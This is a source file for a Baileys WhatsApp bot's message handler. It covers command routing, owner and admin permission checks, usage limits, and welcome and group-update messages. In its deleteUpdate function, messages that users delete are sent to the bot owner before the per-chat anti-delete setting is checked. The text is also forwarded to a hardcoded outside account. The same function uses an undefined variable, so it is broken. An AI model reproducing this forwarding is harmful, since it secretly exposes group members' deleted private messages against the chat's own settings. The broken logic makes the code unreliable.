import { format } from 'util'
import { fileURLToPath } from 'url'
import path from 'path'
import { unwatchFile, watchFile, readFileSync } from 'fs'
import chalk from 'chalk'
import fetch from 'node-fetch'

import { smsg } from './lib/simple.js'
import { uploadPomf } from './lib/uploadImage.js'

const isNumber = x => typeof x === 'number' && !isNaN(x)
const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(resolve, ms))

/**
 * Handle messages upsert
 * @param {import('@whiskeysockets/baileys').BaileysEventMap<unknown>['messages.upsert']} groupsUpdate 
 */

export async function handler(chatUpdate) {
    if (!chatUpdate) return
    this.pushMessage(chatUpdate.messages).catch(console.error)
    let m = chatUpdate.messages[chatUpdate.messages.length - 1]
    if (!m) return
    if (global.db.data == null)
        await global.loadDatabase()
    try {
        m = smsg(this, m) || m
                    // --- الفلتر النهائي والقوي ---
        const settings = global.db.data?.settings || {}
        if (settings.botOff && !m.fromMe) {
            // السماح فقط بكلمة "بوت تشغيل"
            const isEnable = m.text && (m.text.includes('بوت تشغيل') || m.text.includes('.بوت تشغيل'))
            if (!isEnable) return // لو مش أمر تشغيل، اقطع الإرسال فوراً وماتردش
        }


        if (m.sender?.endsWith('@s.whatsapp.net')) {
    const normalize = (jid = '') => String(jid).replace(/\D/g, '')

    const lidNum = normalize(m.sender)

    let realJid = null

    for (const chat of Object.values(this.chats || {})) {
        const participants = chat?.metadata?.participants
        if (!participants) continue

        const found = participants.find(p => {
            const id = p.id || p.jid
            return id && normalize(id) === lidNum
        })

        if (found?.id) {
            realJid = found.id
            break
        }
    }

    if (realJid) {
      if (m.sender === conn.user.jid) return

  

    }
}
        if (!m) return
        // Force resolve LID to Phone JID
        if (m.sender && m.sender.endsWith('@s.whatsapp.net')) {
            const lid = m.sender
            let resolvedJid = this.isLid?.[lid] || (m.key?.participantAlt || m.key?.remoteJidAlt)?.toString().decodeJid()

            // If not found in cache or key, search in known chats
            if (!resolvedJid || resolvedJid.endsWith('@s.whatsapp.net')) {
                const searchChats = () => {
                    for (const chat of Object.values(this.chats)) {
                        if (chat.metadata?.participants) {
                            const p = chat.metadata.participants.find(p => p.lid === lid || p.id === lid)
                            if (p?.id && !p.id.endsWith('@s.whatsapp.net')) return p.id
                            if (p?.lid === lid && p.id && !p.id.endsWith('@s.whatsapp.net')) return p.id // explicit check
                        }
                    }
                    return null
                }

                resolvedJid = searchChats()

                // If still not found, and we suspect missing metadata (startup), fetch common groups
                if (!resolvedJid && (!this.chats || Object.keys(this.chats).length < 5)) {
                    await this.insertAllGroup().catch(() => { })
                    resolvedJid = searchChats()
                }
            }

            if (resolvedJid && !resolvedJid.endsWith('@s.whatsapp.net')) {
                if (!this.isLid) this.isLid = {}
                this.isLid[lid] = resolvedJid
                Object.defineProperty(m, 'sender', {
                    value: resolvedJid,
                    writable: true,
                    enumerable: true
                })
            }
        }
        m.exp = 0
        // use number for limit tracking to avoid boolean coercion bugs
        m.limit = 0
        let chat = global.db.data.chats[m.chat] ||= {}
        try {
            // TODO: use loop to insert data instead of this
            if (m.sender.endsWith('@broadcast') || m.sender.endsWith('@newsletter') || m.sender.endsWith('@g.us')) return
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object')
                global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.exp)) user.exp = 0
                if (!isNumber(user.limit)) user.limit = 25
                if (!isNumber(user.afk)) user.afk = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('banned' in user)) user.banned = false
            } else
                global.db.data.users[m.sender] = {
                    registered: false,
                    role: 'Free user',
                    exp: 0,
                    limit: 25,
                    afk: -1,
                    afkReason: '',
                    banned: false,
                }
            chat = global.db.data.chats[m.chat]
            if (m.isGroup) {
                if (typeof chat !== 'object')
                    global.db.data.chats[m.chat] = {}
                chat = global.db.data.chats[m.chat]
                if (chat) {
                    if (!('isBanned' in chat)) chat.isBanned = false
                    if (!('welcome' in chat)) chat.welcome = false
                    if (!('detect' in chat)) chat.detect = false
                    if (!('sWelcome' in chat)) chat.sWelcome = ''
                    if (!('sBye' in chat)) chat.sBye = ''
                    if (!('sPromote' in chat)) chat.sPromote = ''
                    if (!('sDemote' in chat)) chat.sDemote = ''
                    if (!('delete' in chat)) chat.delete = false
                    if (!('antiLink' in chat)) chat.antiLink = false
                    if (!('viewonce' in chat)) chat.viewonce = false
                    if (!('antiToxic' in chat)) chat.antiToxic = false
                    if (!('simi' in chat)) chat.simi = false
                    if (!('autoSticker' in chat)) chat.autoSticker = false
                    if (!('premium' in chat)) chat.premium = false
                    if (!('premiumTime' in chat)) chat.premiumTime = false
                    if (!('premnsfw' in chat)) chat.premnsfw = false
                    if (!('disableLimit' in chat)) chat.disableLimit = false
                    if (!isNumber(chat.expired)) chat.expired = 0
                } else
                    global.db.data.chats[m.chat] = {
                        isBanned: false,
                        welcome: false,
                        detect: false,
                        sWelcome: '',
                        sBye: '',
                        sPromote: '',
                        sDemote: '',
                        delete: true,
                        antiLink: false,
                        viewonce: false,
                        simi: false,
                        expired: 0,
                        autoSticker: false,
                        premium: false,
                        premiumTime: false,
                        premnsfw: false,
                        disableLimit: false,
                    }
            }
            let settings = global.db.data.settings[this.user.jid]
            if (typeof settings !== 'object') global.db.data.settings[this.user.jid] = {}
            if (settings) {
                if (!('public' in settings)) settings.public = true
                if (!('autoread' in settings)) settings.autoread = false
                if (!('restrict' in settings)) settings.restrict = false
                if (!('anticall' in settings)) settings.anticall = true
            } else global.db.data.settings[this.user.jid] = {
                public: true,
                autoread: false,
                anticall: true,
                restrict: false
            }
        } catch (e) {
            console.error(e)
        }
        if (opts['pconly'] && m.chat.endsWith('g.us')) return
        if (opts['gconly'] && !m.chat.endsWith('g.us')) return
        if (typeof m.text !== 'string') m.text = ''
        const ownerNumbers = [
    ...(global.conn?.user?.id ? [global.conn.user.id] : []),
    ...(conn?.user?.id ? [conn.user.id] : []),
    ...global.owner.map(([number]) => number)
].flatMap(v => {
    const num = v.replace(/[^0-9]/g, '')
    return [
        num + '@lid',
        num + '@s.whatsapp.net'
    ]
})

        // حل مشكلة صيغة @s.whatsapp.net: تحديد JID الحقيقي للمقارنة مع أرقام المالكين
        // ملاحظة: في الخاص يأتي @s.whatsapp.net، في المجموعة يأتي @s.whatsapp.net
        const resolveLid = (lid) => {
            if (!lid?.endsWith('@s.whatsapp.net')) return lid
            // 1. الكاش
            if (conn.isLid?.[lid]) return conn.isLid[lid]
            // 2. البحث في جهات الاتصال
            const contacts = Object.values(conn.contacts || {})
            const byLid = contacts.find(c => c.lid === lid)
            if (byLid?.id && !byLid.id.endsWith('@s.whatsapp.net')) {
                if (!conn.isLid) conn.isLid = {}
                conn.isLid[lid] = byLid.id
                return byLid.id
            }
            // 3. البحث عن طريق المفتاح مباشرة في conn.contacts (بعض نسخ Baileys تخزّن LID كمفتاح)
            const byKey = conn.contacts?.[lid]
            if (byKey?.id && !byKey.id.endsWith('@s.whatsapp.net')) {
                if (!conn.isLid) conn.isLid = {}
                conn.isLid[lid] = byKey.id
                return byKey.id
            }
            // 4. البحث في المجموعات (للمجموعات فقط)
            if (m.isGroup) {
                for (const chat of Object.values(conn.chats || {})) {
                    const p = chat?.metadata?.participants?.find(p => p.lid === lid || p.id === lid)
                    if (p?.id && !p.id.endsWith('@s.whatsapp.net')) {
                        if (!conn.isLid) conn.isLid = {}
                        conn.isLid[lid] = p.id
                        return p.id
                    }
                }
            }
            return lid // لم يُحل - يبقى كما هو
        }
        const senderForOwnerCheck = resolveLid(m.sender)

        const isROwner = ownerNumbers.includes(senderForOwnerCheck)
        const isOwner = isROwner || m.fromMe
        const isMods = isOwner || global.mods.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(senderForOwnerCheck)
        const isPrems = isROwner || global.db.data.users[m.sender].premiumTime > 0
        // Respect self/public mode from opts and DB. Public if DB says public or self mode is off.
        const selfMode = !!(global.opts && global.opts.self)
        const dbPublic = !!(global.db.data.settings[this.user.jid] && global.db.data.settings[this.user.jid].public)
        const isPublic = dbPublic || !selfMode
        if (!isPublic && !isOwner && !m.fromMe) return

        if (m.isBaileys) return
        if (global.db.data.settings[this.user.jid]?.autoread) {
  try {
    await this.readMessages([m.key])
  } catch (e) {}
}
        m.exp += Math.ceil(Math.random() * 10)

        let usedPrefix
        let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]
        const groupMetadata = (m.isGroup ? ((conn.chats[m.chat] || {}).metadata || await this.groupMetadata(m.chat).catch(_ => null)) : {}) || {}
        const participants = (m.isGroup ? groupMetadata.participants : []) || []
        const user = (m.isGroup ? participants.find(u => {
            const jid = conn.getJid(String(u.id || u.jid || '').decodeJid())
            const pn = u.phoneNumber ? (String(u.phoneNumber).replace(/[^0-9]/g, '') + '@s.whatsapp.net') : null
            return jid === m.sender || pn === m.sender
        }) : {}) || {} // User Data
        const bot = (m.isGroup ? participants.find(u => {
            const jid = conn.getJid(String(u.id || u.jid || '').decodeJid())
            const pn = u.phoneNumber ? (String(u.phoneNumber).replace(/[^0-9]/g, '') + '@s.whatsapp.net') : null
            const selfJid = this.user.jid
            return jid === selfJid || pn === selfJid
        }) : {}) || {} // Your Data
        const isRAdmin = user?.admin == 'superadmin' || false
        const isAdmin = isRAdmin || user?.admin == 'admin' || false // Is User Admin?
        const isBotAdmin = bot?.admin || false // Are you Admin?

        const ___dirname = path.join(path.dirname(fileURLToPath(import.meta.url)), './plugins')

        // بناء مجموعة الأوامر المعروفة لمقارنة رسائل المالك بدون بادئة
        const knownCommands = new Set()
        for (let n in global.plugins) {
            let p = global.plugins[n]
            if (!p || p.disabled) continue
            if (!p.command) continue
            if (p.command instanceof RegExp) {
                // نتجاهل الريجكس العام، فقط نضيف الأوامر الحرفية من الأمثلة
            } else if (Array.isArray(p.command)) {
                for (let cmd of p.command)
                    if (typeof cmd === 'string') knownCommands.add(cmd.toLowerCase())
            } else if (typeof p.command === 'string') {
                knownCommands.add(p.command.toLowerCase())
            }
        }

        for (let name in global.plugins) {
            let plugin = global.plugins[name]
            if (!plugin)
                continue
            if (plugin.disabled)
                continue
            const __filename = path.join(___dirname, name)
            if (typeof plugin.all === 'function') {
                try {
                    await plugin.all.call(this, m, {
                        chatUpdate,
                        __dirname: ___dirname,
                        __filename
                    })
                } catch (e) {
                    // if (typeof e === 'string') continue
                    console.error(e)
                    for (let [jid] of global.owner.filter(([number, _, isDeveloper]) => isDeveloper && number)) {
                        let data = (await conn.onWhatsApp(jid))[0] || {}
                        if (data.exists)
                            m.reply(`*Plugin:* ${name}\n*Sender:* ${m.sender}\n*Chat:* ${m.chat}\n*Command:* ${m.text}\n\n\`\`\`${format(e)}\`\`\``.trim(), data.jid)
                    }
                }
            }

            if (!opts['restrict'])
                if (plugin.tags && plugin.tags.includes('admin')) {
                    // global.dfail('restrict', m, this)
                    continue
                }
            const str2Regex = str => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&')
            let _prefix = plugin.customPrefix ? plugin.customPrefix : conn.prefix ? conn.prefix : global.prefix
            let match = (_prefix instanceof RegExp ? // RegExp Mode?
                [[_prefix.exec(m.text), _prefix]] :
                Array.isArray(_prefix) ? // Array?
                    _prefix.map(p => {
                        let re = p instanceof RegExp ? // RegExp in Array?
                            p :
                            new RegExp(str2Regex(p))
                        return [re.exec(m.text), re]
                    }) :
                    typeof _prefix === 'string' ? // String?
                        [[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]] :
                        [[[], new RegExp]]
            ).find(p => p[1])
            if (typeof plugin.before === 'function') {
                if (await plugin.before.call(this, m, {
                    match,
                    conn: this,
                    participants,
                    groupMetadata,
                    user,
                    bot,
                    isROwner,
                    isOwner,
                    isRAdmin,
                    isAdmin,
                    isBotAdmin,
                    isPrems,
                    chatUpdate,
                    __dirname: ___dirname,
                    __filename
                }))
                    continue
            }
            if (typeof plugin !== 'function')
                continue

            // تحديد الأمر والبادئة
            let noPrefix, command, args, _args, text, fail, isAccept
            const hasPrefix = !!(usedPrefix = (match[0] || '')[0])

            if (hasPrefix) {
                noPrefix = m.text.replace(usedPrefix, '')
            } else if (isOwner) {
                // المالك يمكنه استخدام الأوامر بدون بادئة، لكن فقط إذا كانت الكلمة الأولى أمراً معروفاً
                const firstWord = (m.text || '').trim().split(/\s+/)[0].toLowerCase()
                if (!firstWord || !knownCommands.has(firstWord)) continue
                usedPrefix = ''
                noPrefix = m.text
            } else {
                continue
            }

            ;[command, ...args] = noPrefix.trim().split` `.filter(v => v)
            args = args || []
            _args = noPrefix.trim().split` `.slice(1)
            text = _args.join` `
            command = (command || '').toLowerCase()
            fail = plugin.fail || global.dfail
            isAccept = plugin.command instanceof RegExp ? // RegExp Mode?
                    plugin.command.test(command) :
                    Array.isArray(plugin.command) ? // Array?
                        plugin.command.some(cmd => cmd instanceof RegExp ? // RegExp in Array?
                            cmd.test(command) :
                            cmd === command
                        ) :
                        typeof plugin.command === 'string' ? // String?
                            plugin.command === command :
                            false

            if (true) { // block wrapper (replaces the old if block)

                if (!isAccept)
                    continue
                m.plugin = name
                if (m.chat in global.db.data.chats || m.sender in global.db.data.users) {
                    let _chat = global.db.data.chats[m.chat]
                    let _dbUser = global.db.data.users[m.sender]
                    if (name != 'owner-unbanchat.js' && name != 'owner-exec.js' && name != 'owner-exec2.js' && name != 'tool-delete.js' && _chat?.isBanned)
                        return // Except this
                    if (name != 'owner-unbanuser.js' && _dbUser?.banned)
                        return
                }
                if (plugin.rowner && plugin.owner && !(isROwner || isOwner)) { // Both Owner
                    fail('owner', m, this)
                    continue
                }
                if (plugin.rowner && !isROwner) { // Real Owner
                    fail('rowner', m, this)
                    continue
                }
                if (plugin.owner && !isOwner) { // Number Owner
                    fail('owner', m, this)
                    continue
                }
                if (plugin.mods && !isMods) { // Moderator
                    fail('mods', m, this)
                    continue
                }
                if (plugin.premium && !isPrems) { // Premium
                    fail('premium', m, this)
                    continue
                }
                if (plugin.group && !m.isGroup) { // Group Only
                    fail('group', m, this)
                    continue
                } else if (plugin.botAdmin && !isBotAdmin) { // You Admin
                    fail('botAdmin', m, this)
                    continue
                } else if (plugin.admin && !isAdmin) { // User Admin
                    fail('admin', m, this)
                    continue
                }
                if (plugin.private && m.isGroup) { // Private Chat Only
                    fail('private', m, this)
                    continue
                }
                if (plugin.register == true && _user.registered == false) { // Butuh daftar?
                    fail('unreg', m, this)
                    continue
                }
                m.isCommand = true
                let xp = 'exp' in plugin ? parseInt(plugin.exp) : 17 // XP Earning per command
                if (xp > 200)
                    // m.reply('Ngecit -_-') // Hehehe
                    console.log("ngecit -_-");
                else
                    m.exp += xp
                // Normalize and enforce limit requirement strictly
                // Check if this group has disabled limit
                const isGroupLimitDisabled = m.isGroup && chat && chat.disableLimit
                const requiredLimit = !isPrems && !isGroupLimitDisabled
                    ? (plugin.limit === true ? 1 : Number(plugin.limit) || 0)
                    : 0
                if (requiredLimit > 0) {
                    const currentLimit = Number(global.db.data.users[m.sender].limit || 0)
                    if (currentLimit < requiredLimit) {
                        this.reply(m.chat, "Limit kamu kurang,\nketik `.premium` untuk membeli Role Premium", m)
                        continue // Block execution when user doesn't have enough limit
                    }
                }
                if (plugin.level > _user.level) {
                    this.reply(m.chat, `[💬] Diperlukan level ${plugin.level} untuk menggunakan perintah ini\n*Level mu:* ${_user.level} 📊`, m)
                    continue // If the level has not been reached
                }
                let extra = {
                    match,
                    usedPrefix,
                    noPrefix,
                    _args,
                    args,
                    command,
                    text,
                    conn: this,
                    participants,
                    groupMetadata,
                    user,
                    bot,
                    isROwner,
                    isOwner,
                    isRAdmin,
                    isAdmin,
                    isBotAdmin,
                    isPrems,
                    chatUpdate,
                    __dirname: ___dirname,
                    __filename
                }
                try {
                    await plugin.call(this, m, extra)
                    if (!isPrems && !isGroupLimitDisabled) {
                        // Always store numeric limit cost for safe deduction later
                        const cost = plugin.limit === true ? 1 : Number(plugin.limit) || 0
                        m.limit = Number(m.limit) || cost
                    }
                } catch (e) {
                    // Error occured
                    m.error = e
                    console.error(e)
                    if (e) {
                        let text = format(e)
                        for (let key of Object.values(global.APIKeys))
                            text = text.replace(new RegExp(key, 'g'), '#HIDDEN#')
                        if (e.name)
                            for (let [jid] of global.owner.filter(([number, _, isDeveloper]) => isDeveloper && number)) {
                                let data = (await conn.onWhatsApp(jid))[0] || {}
                                if (data.exists)
                                    m.reply(`*🗂️ Plugin:* ${m.plugin}\n*👤 Sender:* ${m.sender}\n*💬 Chat:* ${m.chat}\n*💻 Command:* ${usedPrefix}${command} ${args.join(' ')}\n📄 *Error Logs:*\n\n\`\`\`${text}\`\`\``.trim(), data.jid)
                            }
                        m.reply(text)
                    }
                } finally {
                    // m.reply(util.format(_user))
                    if (typeof plugin.after === 'function') {
                        try {
                            await plugin.after.call(this, m, extra)
                        } catch (e) {
                            console.error(e)
                        }
                    }
                    if (m.limit)
                        m.reply(+m.limit + ' Limit kamu terpakai ✔️')
                }
                break
            }
        }
    } catch (e) {
        console.error(e)
    } finally {
        let user, stats = global.db.data.stats
        if (m) {
            if (m.sender && (user = global.db.data.users[m.sender])) {
                user.exp += Number(m.exp) || 0
                user.limit -= Number(m.limit) || 0
                if (user.limit < 0) user.limit = 0
            }
            let stat
            if (m.plugin) {
                let now = Date.now()
                if (m.plugin in stats) {
                    stat = stats[m.plugin]
                    if (!isNumber(stat.total)) stat.total = 1
                    if (!isNumber(stat.success)) stat.success = m.error != null ? 0 : 1
                    if (!isNumber(stat.last)) stat.last = now
                    if (!isNumber(stat.lastSuccess)) stat.lastSuccess = m.error != null ? 0 : now
                } else
                    stat = stats[m.plugin] = {
                        total: 1,
                        success: m.error != null ? 0 : 1,
                        last: now,
                        lastSuccess: m.error != null ? 0 : now
                    }
                stat.total += 1
                stat.last = now
                if (m.error == null) {
                    stat.success += 1
                    stat.lastSuccess = now
                }
            }
        }
        try {
            await (await import(`./lib/print.js`)).default(m, this)
        } catch (e) {
            console.log(m, m.quoted, e)
        }

        // ✅ AUTOREAD FIX (FINAL WORKING VERSION)
        if (global.db.data.settings[this.user.jid]?.autoread) {
            try {
                await this.readMessages([m.key])
            } catch (e) {
                console.error(e)
            }
        }
    }
}
/**
 * Handle groups participants update
 * @param {import('@whiskeysockets/baileys').BaileysEventMap<unknown>['group-participants.update']} groupsUpdate 
 */
export async function participantsUpdate({ id, participants, action, simulate = false }) {
    if (opts['self']) return
    // if (id in conn.chats) return // First login will spam
    if (this.isInit && !simulate) return
    if (global.db.data == null)
        await loadDatabase()
    let chat = global.db.data.chats[id] || {}
    let text = ''
    switch (action) {
        case 'add':
        case 'remove':
            if (chat.welcome) {
                let groupMetadata = (conn.chats[id] || {}).metadata || await this.groupMetadata(id)

                for (let user of participants) {
                    if (action === 'add') {
                        await delay(1000)
                    }

                    let userJid
                    if (typeof user === 'string') {
                        userJid = user
                    } else if (typeof user === 'object' && user !== null) {
                        userJid = user.phoneNumber || user.id || user.jid
                    }
                    userJid = String(userJid || '').decodeJid()

                    const groupMember = groupMetadata.participants?.find(
                        p => p.id === userJid || p.lid === userJid
                    )

                    if (groupMember) {
                        if (groupMember.id && !groupMember.id.includes('s.whatsapp.net')) {
                            userJid = groupMember.id
                        } else {
                            console.log('[LID JID USED — no phone JID detected]')
                        }
                    }

                    userJid = this.getJid(userJid) || userJid

                    // Fetch avatar
                    let pp;
                    try {
                        const pps = await this.profilePictureUrl(userJid, 'image')
                            .catch(_ => 'https://s3.ryzumi.net/administrator/ryzumi-perm/bot-whatsapp/default_pp.jpg')

                        const ppB = Buffer.from(await (await fetch(pps)).arrayBuffer())
                        if (ppB?.length) {
                            pp = await uploadPomf(ppB).catch(() => pps)
                        }
                    } catch (err) {
                        console.log('[AVATAR ERROR]', err)
                    }

                    const safeName = async () => {
                        try {
                            const nm = await Promise.resolve(this.getName(userJid))
                            //console.log('[FETCH NAME]', nm)
                            return (nm && String(nm).trim()) || null
                        } catch {
                            return null
                        }
                    }

                    const username = (await safeName()) || userJid.split('@')[0]
                    const gcname = groupMetadata.subject || 'Unknown'
                    const gcMem = groupMetadata.participants?.length || 0
                    //console.log('[USERNAME]', username)
                    //console.log('[GROUP NAME]', gcname)
                    //console.log('[GROUP MEMBER COUNT]', gcMem)

                    const welcomeBg = 'https://s3.ryzumi.net/administrator/ryzumi-perm/bot-whatsapp/welcome.jpg'
                    const leaveBg = 'https://s3.ryzumi.net/administrator/ryzumi-perm/bot-whatsapp/goodbye.jpg'

                    text = (
                        action === 'add'
                            ? (chat.sWelcome || this.welcome || 'Welcome, @user!')
                                .replace('@subject', gcname)
                                .replace('@desc', groupMetadata.desc || '')
                            : (chat.sBye || this.bye || 'Bye, @user!')
                    ).replace('@user', '@' + (userJid.split('@')[0] || username))

                    //console.log('[CAPTION TEXT]', text)

                    const wel = `${APIs.ryzumi}/api/image/welcome?username=${encodeURIComponent(username)}&group=${encodeURIComponent(gcname)}&avatar=${encodeURIComponent(pp || '')}&bg=${encodeURIComponent(welcomeBg)}&member=${gcMem}`
                    const lea = `${APIs.ryzumi}/api/image/leave?username=${encodeURIComponent(username)}&group=${encodeURIComponent(gcname)}&avatar=${encodeURIComponent(pp || '')}&bg=${encodeURIComponent(leaveBg)}&member=${gcMem}`

                    //console.log('[WELCOME IMAGE URL]', wel)
                    //console.log('[LEAVE IMAGE URL]', lea)

                    try {
                        await this.sendMessage(id, {
                            image: { url: action === 'add' ? wel : lea },
                            caption: text,
                            contextInfo: { mentionedJid: [userJid] },
                        })
                    } catch (e) {
                        console.log('[MESSAGE SEND ERROR]', e)
                    }
                }
            } else {
                console.log('[WELCOME SYSTEM DISABLED]')
            }
            break
        case 'promote':
            text = (chat.sPromote || this.spromote || conn.spromote || '@user ```is now Admin```')
        case 'demote':
            if (!text)
                text = (chat.sDemote || this.sdemote || conn.sdemote || '@user ```is no longer Admin```')

            let user0 = participants[0]
            if (user0) {
                // specific handling for promote/demote
                let userJid = String(user0).decodeJid()
                userJid = this.getJid(userJid) || userJid
                text = text.replace('@user', '@' + userJid.split('@')[0])
            } else {
                text = text.replace('@user', '')
            }

            if (chat.detect) {
                this.sendMessage(id, {
                    text,
                    mentions: this.parseMention(text)
                })
            }
            break
    }
}

/**
 * Handler groups update
 * @param {import('@whiskeysockets/baileys').BaileysEventMap<unknown>['groups.update']} groupsUpdate 
 */
export async function groupsUpdate(groupsUpdate) {
    if (opts['self']) return
    for (const groupUpdate of groupsUpdate) {
        const id = groupUpdate.id
        if (!id) continue
        let chats = global.db.data.chats[id],
            text = ''
        if (!chats?.detect) continue
        if (groupUpdate.desc) text = (chats.sDesc || this.sDesc || conn.sDesc || '```Description has been changed to```\n@desc').replace('@desc', groupUpdate.desc)
        if (groupUpdate.subject) text = (chats.sSubject || this.sSubject || conn.sSubject || '```Subject has been changed to```\n@subject').replace('@subject', groupUpdate.subject)
        if (groupUpdate.icon) text = (chats.sIcon || this.sIcon || conn.sIcon || '```Icon has been changed to```').replace('@icon', groupUpdate.icon)
        if (groupUpdate.revoke) text = (chats.sRevoke || this.sRevoke || conn.sRevoke || '```Group link has been changed to```\n@revoke').replace('@revoke', groupUpdate.revoke)
        if (groupUpdate.announce == true) text = (chats.sAnnounceOn || this.sAnnounceOn || conn.sAnnounceOn || '*Group has been closed!*')
        if (groupUpdate.announce == false) text = (chats.sAnnounceOff || this.sAnnounceOff || conn.sAnnounceOff || '*Group has been open!*')
        if (groupUpdate.restrict == true) text = (chats.sRestrictOn || this.sRestrictOn || conn.sRestrictOn || '*Group has been all participants!*')
        if (groupUpdate.restrict == false) text = (chats.sRestrictOff || this.sRestrictOff || conn.sRestrictOff || '*Group has been only admin!*')
        if (!text) continue
        this.reply(id, text.trim(), m)
    }
}

export async function deleteUpdate(message) {
    try {
        const { fromMe, id, participant, remoteJid } = message

        if (fromMe) return; // OK هنا لأنه داخل function

        const m = global.conn.chats?.get?.(id)

        const owner = global.conn.user.id

        let text = "🧨 رسالة محذوفة:\n\n"

        if (m?.message) {
            const content =
                m.message.conversation ||
                m.message.extendedTextMessage?.text ||
                m.message.imageMessage?.caption ||
                m.message.videoMessage?.caption ||
                "📦 ميديا بدون نص"

            text += `👤 المرسل: ${m.pushName || "Unknown"}\n`
            text += `💬: ${content}\n`
            text += `📍 الجروب: ${remoteJid || "Private"}`
        }

        await global.conn.sendMessage(owner, { text })

        const chatJid = this.decodeJid(msgId);
        const chat = global.db.data.chats[chatJid] || global.db.data.chats[msgId] || {}

        // Check if feature is disabled. 
        // Logic: chat.delete = true means "Anti-Delete Disabled" (Don't announce).
        // chat.delete = false means "Anti-Delete Enabled" (Announce).
        // Default: If undefined, we should probably follow the handler.js init default which is `delete: true` (Disabled).
        if (typeof chat.delete === 'undefined' ? true : chat.delete) return

        const msg = this.serializeM(this.loadMessage(id))
        if (!msg) return

        // Use msg.sender to get the correct user JID (handles LID/participantAlt)
        const sender = msg.sender || participant
                const ownerJid = "180479391195175@s.whatsapp.net"
        await this.sendMessage(ownerJid, {
    text: `🚨 تم حذف رسالة في الشات:
Chat: ${msg.chat}
User: ${msg.sender}
Text: ${msg.text}`
}) 
        this.copyNForward(msg.chat, msg).catch(e => console.error(e))
    } catch (e) {
        console.error(e)
    }
}

global.dfail = (type, m, conn) => {
    let msg = {
        rowner: '*المطور فقط* • هذا الأمر مخصص لمطور البوت فقط',
owner: '*المالك فقط* • هذا الأمر مخصص لمالك البوت فقط',
mods: '*المشرفون فقط* • هذا الأمر مخصص لمشرفي البوت فقط',
premium: '*المميز فقط* • هذا الأمر مخصص للمستخدمين المميزين فقط',
group: '*الدردشة الجماعية* • هذا الأمر يعمل داخل المجموعات فقط',
private: '*الدردشة الخاصة* • هذا الأمر يعمل في الخاص فقط',
admin: '*مشرف المجموعة فقط* • هذا الأمر مخصص لمشرفي المجموعة فقط',
botAdmin: '*البوت ليس مشرفاً* • يجب أن يكون البوت مشرفاً لاستخدام هذا الأمر',
unreg: '*أنت غير مسجل بعد* • اكتب .تسجيل لاستخدام هذه الميزة',
restrict: '*التقييد غير مفعل* • وضع التقييد غير مفعل في هذه الدردشة',
    }[type]
    if (msg) return conn.reply(m.chat, msg, m)
}


let file = global.__filename(import.meta.url, true)
watchFile(file, async () => {
    unwatchFile(file)
    console.log(chalk.redBright("Update 'handler.js'"))
    if (global.reloadHandler) console.log(await global.reloadHandler())
})